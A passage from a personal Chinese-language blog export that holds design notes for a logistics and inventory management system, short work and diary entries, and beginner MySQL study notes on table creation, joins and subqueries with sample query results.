<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706163924947.png" alt="image-20230706163924947"></p>
<h3 id="4-1-产品库存查询"><a href="#4-1-产品库存查询" class="headerlink" title="4.1 产品库存查询"></a>4.1 产品库存查询</h3><h3 id="4-2-条码库存查询"><a href="#4-2-条码库存查询" class="headerlink" title="4.2 条码库存查询"></a>4.2 条码库存查询</h3><h3 id="4-3-产品实际库存与计算库存校验"><a href="#4-3-产品实际库存与计算库存校验" class="headerlink" title="4.3 产品实际库存与计算库存校验"></a>4.3 产品实际库存与计算库存校验</h3><h4 id="4-3-1-与金蝶系统库存对比"><a href="#4-3-1-与金蝶系统库存对比" class="headerlink" title="4.3.1 与金蝶系统库存对比"></a>4.3.1 与金蝶系统库存对比</h4><h3 id="4-4-条码实际库存与计算库存校验"><a href="#4-4-条码实际库存与计算库存校验" class="headerlink" title="4.4 条码实际库存与计算库存校验"></a>4.4 条码实际库存与计算库存校验</h3><h3 id="4-5-产品与条码库存一致性校验"><a href="#4-5-产品与条码库存一致性校验" class="headerlink" title="4.5 产品与条码库存一致性校验"></a>4.5 产品与条码库存一致性校验</h3><h3 id="4-6-条码库龄分析"><a href="#4-6-条码库龄分析" class="headerlink" title="4.6 条码库龄分析"></a>4.6 条码库龄分析</h3><p>对库存盘点后的条码库龄分段。对退还条码自动搜索出对应的供应商发货时间。</p>
<hr>
<p>库龄：</p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706165535402.png" alt="image-20230706165535402"></p>
<h3 id="4-7-条码历史库存对比"><a href="#4-7-条码历史库存对比" class="headerlink" title="4.7 条码历史库存对比"></a>4.7 条码历史库存对比</h3><h3 id="4-8-条码产品库存金额统计"><a href="#4-8-条码产品库存金额统计" class="headerlink" title="4.8 条码产品库存金额统计"></a>4.8 条码产品库存金额统计</h3><h3 id="4-9-盘点表"><a href="#4-9-盘点表" class="headerlink" title="4.9 盘点表"></a>4.9 盘点表</h3><h3 id="4-x-借货比例统计"><a href="#4-x-借货比例统计" class="headerlink" title="4.x 借货比例统计"></a>4.x 借货比例统计</h3><h1 id="采购入库"><a href="#采购入库" class="headerlink" title="采购入库"></a><strong>采购入库</strong></h1><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E9%87%87%E8%B4%AD%E5%85%A5%E5%BA%93.png" alt="采购入库"></p>
<p><strong>入库仓位选择</strong></p>
<ul>
<li><p>产品按项目库存、分销库存分开管理</p>
</li>
<li><p>H3C产品入库管理:</p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E8%AE%A2%E5%8D%95%E5%B1%9E%E6%80%A7.png" alt="订单属性"></p>
</li>
</ul>
<h1 id="其他出入库"><a href="#其他出入库" class="headerlink" title="其他出入库"></a>其他出入库</h1><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%85%B6%E4%BB%96%E5%87%BA%E5%85%A5%E5%BA%93.png" alt="其他出入库"></p>
<h1 id="退-还货管理"><a href="#退-还货管理" class="headerlink" title="退/还货管理"></a><strong>退/还货管理</strong></h1><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E9%80%80_%E8%BF%98%E8%B4%A7%E7%AE%A1%E7%90%86.png" alt="退_还货管理"></p>
<h1 id="CT分销库存产品统计"><a href="#CT分销库存产品统计" class="headerlink" title="CT分销库存产品统计"></a><strong>CT分销库存产品统计</strong></h1><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/CT%E5%88%86%E9%94%80%E5%BA%93%E5%AD%98%E4%BA%A7%E5%93%81%E7%BB%9F%E8%AE%A1.png" alt="CT分销库存产品统计"></p>
<p>条码管理</p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%9D%A1%E7%A0%81%E7%AE%A1%E7%90%86.png" alt="条码管理"></p>
<h1 id="金蝶云入库单生成功能、金蝶云产品物料添加功能、查询对比功能"><a href="#金蝶云入库单生成功能、金蝶云产品物料添加功能、查询对比功能" class="headerlink" title="金蝶云入库单生成功能、金蝶云产品物料添加功能、查询对比功能"></a>金蝶云入库单生成功能、金蝶云产品物料添加功能、查询对比功能</h1><h1 id="订单通知识别"><a href="#订单通知识别" class="headerlink" title="订单通知识别"></a>订单通知识别</h1><h2 id="订单通知识别-H3C"><a href="#订单通知识别-H3C" class="headerlink" title="订单通知识别-H3C"></a><strong>订单通知识别-H3C</strong></h2><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230703153452539.png" alt="image-20230703153452539"></p>
<h2 id="订单通知识别-华智"><a href="#订单通知识别-华智" class="headerlink" title="订单通知识别-华智"></a>订单通知识别-华智</h2><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230703154116994.png" alt="image-20230703154116994"></p>
<h2 id="订单通知识别-恒越"><a href="#订单通知识别-恒越" class="headerlink" title="订单通知识别-恒越"></a>订单通知识别-恒越</h2><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230703154331135.png" alt="image-20230703154331135"></p>
<h1 id="CBS数据管理"><a href="#CBS数据管理" class="headerlink" title="CBS数据管理"></a>CBS数据管理</h1><blockquote>
<ol>
<li>反映出<strong>实际出货</strong>和<strong>业绩申报</strong>的对应关系。</li>
<li>反映<strong>合同出货</strong>和<strong>业绩申报</strong>的延续性和完整性。</li>
</ol>
</blockquote>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706161845629.png" alt="image-20230706161845629"></p>
<ul>
<li>实际库存</li>
<li>CBS库存</li>
</ul>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706162223587.png" alt="image-20230706162223587"></p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706162411640.png" alt="image-20230706162411640"></p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706162424712.png" alt="image-20230706162424712"></p>
<p><strong>CBS类型及其逻辑关系流程图</strong></p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706162531394.png" alt="image-20230706162531394"></p>
<h1 id="分销虚库管理"><a href="#分销虚库管理" class="headerlink" title="分销虚库管理"></a>分销虚库管理</h1><p>​    依据当周实际出货，可选择部分转入<strong>虚库</strong>暂不申报业绩，形成虚库的入库；从虚库中选择系列产品上报业绩形成虚库的出库。虚库中可以按代理商进行调拨调整。可完成虚库转分销上报、虚库转项目上报、虚库转借货、借货还回虚库、虚库退回实库等操作。</p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706175528257.png" alt="image-20230706175528257"></p>
<h1 id="销售合同管理"><a href="#销售合同管理" class="headerlink" title="销售合同管理"></a>销售合同管理</h1><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706180509866.png" alt="image-20230706180509866"></p>
<h1 id="项目监控管理"><a href="#项目监控管理" class="headerlink" title="项目监控管理"></a>项目监控管理</h1><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706180543732.png" alt="image-20230706180543732"></p>
<h1 id="进销存条码核算"><a href="#进销存条码核算" class="headerlink" title="进销存条码核算"></a>进销存条码核算</h1><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706180613939.png" alt="image-20230706180613939"></p>
<h1 id="销售人员业绩核算"><a href="#销售人员业绩核算" class="headerlink" title="销售人员业绩核算"></a>销售人员业绩核算</h1><h1 id="基础资料维护"><a href="#基础资料维护" class="headerlink" title="基础资料维护"></a>基础资料维护</h1><h1 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h1>]]></content>
      <tags>
        <tag>chips</tag>
      </tags>
  </entry>
  <entry>
    <title>2023年7月2日10:44:13</title>
    <url>/2023/07/02/2023%E5%B9%B47%E6%9C%882%E6%97%A510-44-13/</url>
    <content><![CDATA[<h2 id="资料获取"><a href="#资料获取" class="headerlink" title="资料获取"></a>资料获取</h2><p>背景知识、业务流程、数据结构、金蝶云入库接口对接、CBS类型</p>
<p>订单通知规则、采购订单号规则、《CBS类型设计文档》</p>
<h2 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h2><p>采购合同号的规则（厂家）。</p>
<p>不同订单类型。</p>
<h2 id="出库"><a href="#出库" class="headerlink" title="出库"></a>出库</h2><p><strong>CBS类型</strong></p>
<ul>
<li>一般出货(总部仓库出去)</li>
<li>厂商直发(厂家直接提货出去)</li>
</ul>
<p><strong>逻辑调拨（逻辑仓位调整）</strong></p>
<p>例：从海宁仓库分销正常仓——&gt;总部仓库分销虚库仓</p>
<p>数据还在逻辑仓里，货已经出去了。后续业绩申报时，针对总部仓库分销虚库进行申报</p>
<p><img src="/2023/07/02/2023%E5%B9%B47%E6%9C%882%E6%97%A510-44-13/image-20230702114707987.png" alt="image-20230702114707987"></p>
<ul>
<li><p><strong>当周分销转虚库</strong>（销售出去了还没报业绩，先转虚库。）</p>
</li>
<li><p><strong>虚库转分销上报</strong>（当周出货当周向厂家报业绩）。</p>
</li>
<li><p>CBS代码（）</p>
</li>
</ul>
<p><strong>产品线</strong></p>
<p>每个产品线至少对应一个厂家 </p>
<p><strong>单据类型</strong></p>
<ul>
<li>出库</li>
<li>退货</li>
<li>借货</li>
<li>还货</li>
</ul>
<p><strong>库存类型</strong></p>
<ul>
<li>项目库</li>
<li>分销库</li>
</ul>
<p><strong>仓库属性</strong></p>
<ul>
<li>厂商直发仓（过一下系统，逻辑仓）</li>
<li>借转销仓（借货转销售，借出去后对方购入，做虚还，入逻辑仓 ）</li>
<li>总代样机仓（样机产品借给客户，用不好(拆封过)还货到<strong>总代样机旧件仓</strong>，用得好借转销）</li>
<li>客户从总代样机仓第一次借出去（入总代样机借货仓）,还货（还到旧件仓），从旧件仓第二次借货（入旧件借货仓）</li>
</ul>
]]></content>
      <tags>
        <tag>record</tag>
      </tags>
  </entry>
  <entry>
    <title>2023年7月3日14:16:59</title>
    <url>/2023/07/03/2023%E5%B9%B47%E6%9C%883%E6%97%A514-16-59/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>2023年8月15日12:50:19</title>
    <url>/2023/08/15/2023%E5%B9%B48%E6%9C%8815%E6%97%A512-50-19/</url>
    <content><![CDATA[<p>人往高处走，水往低处流，前面是人的心理规律，后面是物理规律。</p>
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql数据库基础_袁庭新</title>
    <url>/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/</url>
    <content><![CDATA[<h2 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h2><ul>
<li>Sun公司1996</li>
<li>关系型: 字段对应属性值mysql、oracle</li>
<li>非关系型: nosql</li>
<li>数据库管理系统</li>
</ul>
<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><ul>
<li>Structured Query language_关系型数据库操作语言</li>
<li>DML_manipulation表数据操作_增删改</li>
<li>DQL_query表数据查询_查</li>
<li>DCL——controller定义库的访问权限及安全级别</li>
</ul>
<h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><blockquote>
<p>DDL_definition定义数据库、表、字段</p>
</blockquote>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- dba不存在则创建dba，并指定编码方式utf8
create database if not exists dba character set utf8;

-- 查看dba的详细信息
show  create database dba;

-- 选中dba
use dba;

-- 查询选中的数据库
select database();

&#x2F;*
	表名：商品表_category
	分类：id	int
	名称20个字节：cname	char(20)
*&#x2F;
use dba;
create table category (
		id int,
		cname char(20)
);

-- LIKE克隆表
 create table test2 like test1;
 
 --查看表结构
 desc category
 
 -- 查看表sql定义语句
 show create table category
 
 --删表
 use dba;
 drop table if exists test1
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul>
<li><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112173940133.png" alt="mysql数据类型"></li>
</ul>
<blockquote>
<p> char与varchar区别:</p>
<ul>
<li>char存储固定长度的字符串效率高，性别、身份证号、手机号</li>
<li>varchar适合在一定长度范围内变化的字符串，效率低（扩容或缩容）但节省存储空间，微博正文0-255</li>
</ul>
</blockquote>
<h1 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h1><blockquote>
<p>交叉连接（cross join），将左表每一行与右表每一行分别连接形成新记录。假设集合A={a,b}，集合B={0,1,2},则两个集合的笛卡尔积为{(a,0),(a,1),(a,2),(b,0),(b,1),(b,2)}。将两张表设置关系即可消除笛卡尔积的问题。</p>
</blockquote>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113012203054.png" alt="image-20231113012203054"></p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113012616915.png" alt="image-20231113012616915"></p>
<h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create database db4 character set utf8;‘

use db4;
-- 分类表:主表
create table category(
		cid varchar(32) primary key,
		cname varchar(50)
);
-- 从表
create table products(
		pid varchar(32) primary key,
		pname varchar(50),
		price int,
		flag varchar(2), -- 商品状态：1商品上架，2下架
		category_id varchar(32),
		-- 添加外键
		foreign key (category_id) references category (cid)
);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">use db4;

select count(*) from category; --4
select count(*) from products; --9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112222433527.png" alt="category"></p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112222352850.png" alt="products"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> category<span class="token punctuation">,</span>products<span class="token punctuation">;</span> <span class="token comment">-- 4 * 9=36</span>
c001	家电	p001	小米	<span class="token number">5000</span>	<span class="token number">1</span>	c001
c002	鞋服	p001	小米	<span class="token number">5000</span>	<span class="token number">1</span>	c001
c003	化妆品	p001	小米	<span class="token number">5000</span>	<span class="token number">1</span>	c001
c004	汽车	p001	小米	<span class="token number">5000</span>	<span class="token number">1</span>	c001
c001	家电	p002	 格力空调	<span class="token number">3000</span>	<span class="token number">1</span>	c001
c002	鞋服	p002	 格力空调	<span class="token number">3000</span>	<span class="token number">1</span>	c001
c003	化妆品	p002	 格力空调	<span class="token number">3000</span>	<span class="token number">1</span>	c001
c004	汽车	p002	 格力空调	<span class="token number">3000</span>	<span class="token number">1</span>	c001
c001	家电	p003	 美的冰箱	<span class="token number">4500</span>	<span class="token number">1</span>	c001
c002	鞋服	p003	 美的冰箱	<span class="token number">4500</span>	<span class="token number">1</span>	c001
c003	化妆品	p003	 美的冰箱	<span class="token number">4500</span>	<span class="token number">1</span>	c001
c004	汽车	p003	 美的冰箱	<span class="token number">4500</span>	<span class="token number">1</span>	c001
c001	家电	p004	 篮球鞋	<span class="token number">800</span>	<span class="token number">1</span>	c002
c002	鞋服	p004	 篮球鞋	<span class="token number">800</span>	<span class="token number">1</span>	c002
c003	化妆品	p004	 篮球鞋	<span class="token number">800</span>	<span class="token number">1</span>	c002
c004	汽车	p004	 篮球鞋	<span class="token number">800</span>	<span class="token number">1</span>	c002
c001	家电	p005	 运动裤	<span class="token number">200</span>	<span class="token number">1</span>	c002
c002	鞋服	p005	 运动裤	<span class="token number">200</span>	<span class="token number">1</span>	c002
c003	化妆品	p005	 运动裤	<span class="token number">200</span>	<span class="token number">1</span>	c002
c004	汽车	p005	 运动裤	<span class="token number">200</span>	<span class="token number">1</span>	c002
c001	家电	p006	 T恤	<span class="token number">300</span>	<span class="token number">1</span>	c002
c002	鞋服	p006	 T恤	<span class="token number">300</span>	<span class="token number">1</span>	c002
c003	化妆品	p006	 T恤	<span class="token number">300</span>	<span class="token number">1</span>	c002
c004	汽车	p006	 T恤	<span class="token number">300</span>	<span class="token number">1</span>	c002
c001	家电	p007	 冲锋衣	<span class="token number">2000</span>	<span class="token number">1</span>	c002
c002	鞋服	p007	 冲锋衣	<span class="token number">2000</span>	<span class="token number">1</span>	c002
c003	化妆品	p007	 冲锋衣	<span class="token number">2000</span>	<span class="token number">1</span>	c002
c004	汽车	p007	 冲锋衣	<span class="token number">2000</span>	<span class="token number">1</span>	c002
c001	家电	p008	 神仙水	<span class="token number">800</span>	<span class="token number">1</span>	c003
c002	鞋服	p008	 神仙水	<span class="token number">800</span>	<span class="token number">1</span>	c003
c003	化妆品	p008	 神仙水	<span class="token number">800</span>	<span class="token number">1</span>	c003
c004	汽车	p008	 神仙水	<span class="token number">800</span>	<span class="token number">1</span>	c003
c001	家电	p009	 大宝	<span class="token number">200</span>	<span class="token number">1</span>	c003
c002	鞋服	p009	 大宝	<span class="token number">200</span>	<span class="token number">1</span>	c003
c003	化妆品	p009	 大宝	<span class="token number">200</span>	<span class="token number">1</span>	c003
c004	汽车	p009	 大宝	<span class="token number">200</span>	<span class="token number">1</span>	c003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="inner-join"><a href="#inner-join" class="headerlink" title="inner join"></a>inner join</h2><blockquote>
<p>使用比较运算符进行表的某列数据的比较操作，并将满足比较运算符的结果（即匹配上的数据）重新组合。</p>
</blockquote>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113012807874.png" alt="image-20231113012807874"></p>
<ul>
<li><p>隐式_where将比较运算符声明，作为多表连接条件。where字句会影响查询性能。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> 字段列表 <span class="token keyword">from</span> 表<span class="token number">1</span><span class="token punctuation">,</span>表<span class="token number">2</span> <span class="token keyword">where</span> 关联条件<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询所有的商品信息和对应的分类信息</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> products<span class="token punctuation">,</span>category <span class="token keyword">where</span> category_id <span class="token operator">=</span> cid<span class="token punctuation">;</span>
p001	小米	<span class="token number">5000</span>	<span class="token number">1</span>	c001	c001	家电
p002	 格力空调	<span class="token number">3000</span>	<span class="token number">1</span>	c001	c001	家电
p003	 美的冰箱	<span class="token number">4500</span>	<span class="token number">1</span>	c001	c001	家电
p004	 篮球鞋	<span class="token number">800</span>	<span class="token number">1</span>	c002	c002	鞋服
p005	 运动裤	<span class="token number">200</span>	<span class="token number">1</span>	c002	c002	鞋服
p006	 T恤	<span class="token number">300</span>	<span class="token number">1</span>	c002	c002	鞋服
p007	 冲锋衣	<span class="token number">2000</span>	<span class="token number">1</span>	c002	c002	鞋服
p008	 神仙水	<span class="token number">800</span>	<span class="token number">1</span>	c003	c003	化妆品
p009	 大宝	<span class="token number">200</span>	<span class="token number">1</span>	c003	c003	化妆品<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>显示内连接。on语句遵循ANSI SQL标准，不会忽略连接条件。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 鞋服分类下，价格>500的商品名称和商品价格</span>
<span class="token keyword">select</span> c<span class="token punctuation">.</span>cname<span class="token punctuation">,</span>p<span class="token punctuation">.</span>price <span class="token keyword">from</span> products p <span class="token keyword">join</span> category c <span class="token keyword">on</span> c<span class="token punctuation">.</span>cid <span class="token operator">=</span> p<span class="token punctuation">.</span>category_id <span class="token keyword">where</span> c<span class="token punctuation">.</span>cname<span class="token operator">=</span><span class="token string">'鞋服'</span> <span class="token operator">and</span> p<span class="token punctuation">.</span>price<span class="token operator">></span><span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112215808566.png" alt="image-20231112215808566"></p>
</li>
</ul>
<h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113013403914.png" alt="image-20231113013403914"></p>
<ul>
<li><p>left join将左表作为基表查询所有左表数据以及右表的交集，若右表没有与之匹配的数据则右表NULL显示。</p>
<pre class="line-numbers language-none"><code class="language-none">-- 每个分类下商品详情
select 
		* 
from 
		category c 
left join 
		products p 
on	
		p.category_id&#x3D;c.cid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112222139131.png" alt="image-20231112222139131"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 每个分类下商品个数</span>
<span class="token keyword">select</span>
	cname <span class="token punctuation">,</span>
	<span class="token function">count</span><span class="token punctuation">(</span>pname<span class="token punctuation">)</span> 
<span class="token keyword">from</span> 
		category c 
<span class="token keyword">left</span> <span class="token keyword">join</span> 
		products p 
<span class="token keyword">on</span>	
		p<span class="token punctuation">.</span>category_id<span class="token operator">=</span>c<span class="token punctuation">.</span>cid
<span class="token keyword">group</span> <span class="token keyword">by</span>
		c<span class="token punctuation">.</span>cname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112225538011.png" alt="image-20231112225538011"></p>
</li>
<li><p>right join</p>
<p>以右表为基表，查询所有右表数据以及左表交集，若左表没匹配上则null显示。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 每件商品的分类信息</span>
<span class="token keyword">select</span>
<span class="token operator">*</span> 
<span class="token keyword">from</span>
	products p
<span class="token keyword">right</span> <span class="token keyword">join</span>
	category c
<span class="token keyword">on</span> 
	c<span class="token punctuation">.</span>cid<span class="token operator">=</span>p<span class="token punctuation">.</span>category_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112230325007.png" alt="image-20231112230325007"></p>
</li>
<li><p>联合查询 union</p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113014823540.png" alt="image-20231113014823540"></p>
</li>
</ul>
<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><blockquote>
<p>将一个查询语句作为另一个查询的条件。子查询的结果作为输入内容给父查询</p>
<p>select—from-where作为一个查询块。将一个查询块作为另一个查询块where或者作为having、from部分出现，该查询块为子查询（内层查询），外层的查询块为父查询（外部查询）。</p>
</blockquote>
<ul>
<li><p>where型：将内层查询结果作为外层查询的比较条件（where）</p>
<pre class="line-numbers language-none"><code class="language-none">-- 价格最高的商品信息
select
		*
from 
		products 
where 
		price&#x3D;(select max(price) from products);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112233736779.png" alt="image-20231112233736779"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 化妆品分类下商品名称和价格</span>
<span class="token keyword">select</span> pname<span class="token punctuation">,</span>price <span class="token keyword">from</span> products p <span class="token keyword">where</span> p<span class="token punctuation">.</span>category_id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> cid <span class="token keyword">from</span> category <span class="token keyword">where</span> cname<span class="token operator">=</span><span class="token string">'化妆品'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112234253780.png" alt="image-20231112234253780"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 小于平均价格的商品</span>
